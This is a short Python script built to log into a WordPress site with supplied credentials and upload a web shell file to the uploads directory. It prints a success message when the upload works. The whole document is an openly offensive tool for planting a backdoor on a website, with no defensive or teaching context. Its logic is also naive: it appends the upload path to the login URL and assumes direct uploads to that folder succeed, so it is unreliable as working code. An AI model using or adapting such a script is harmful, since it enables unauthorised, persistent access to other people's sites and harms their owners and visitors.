import requests

def upload_shell(url, username, password, shell_file):
    data = {'log': username, 'pwd': password, 'wp-submit': 'Log In'}
    session = requests.Session()
    session.post(url, data=data)
    
    files = {'file': open(shell_file, 'rb')}
    upload_url = url + '/wp-content/uploads/'  # Assuming upload path
    response = session.post(upload_url, files=files)
    
    if 'uploaded' in response.text:
        print("[+] Shell uploaded successfully!")
    else:
        print("[-] Shell upload failed.")

if __name__ == "__main__":
    url = input("Enter WordPress login URL: ")
    username = input("Enter Username: ")
    password = input("Enter Password: ")
    shell_file = input("Enter path to shell file: ")
    upload_shell(url, username, password, shell_file)